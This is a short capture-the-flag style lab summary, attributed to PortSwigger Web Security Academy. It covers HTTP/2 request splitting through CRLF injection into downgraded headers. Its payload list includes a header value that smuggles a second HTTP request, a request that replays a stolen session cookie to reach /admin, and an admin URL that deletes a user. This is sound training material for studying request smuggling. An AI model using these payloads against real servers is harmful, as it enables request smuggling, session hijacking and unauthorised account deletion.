## HTTP/2 request splitting via CRLF injection

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

### Solution Steps
To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the
Shift + Return
keys. Note that this feature is not available when you double-click on the header.

### Key Payloads
- `carlos`
- `/admin`
- `Shift + Return`
- `GET /`
- `\r\n`
- `bar\r\n\r\nGET /x HTTP/1.1\r\nHost: YOUR-LAB-ID.web-security-academy.net`
- `\r\n\r\n`
- `GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE`
- `/admin/delete?username=carlos`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: request_smuggling

---
*Source: PortSwigger Web Security Academy*
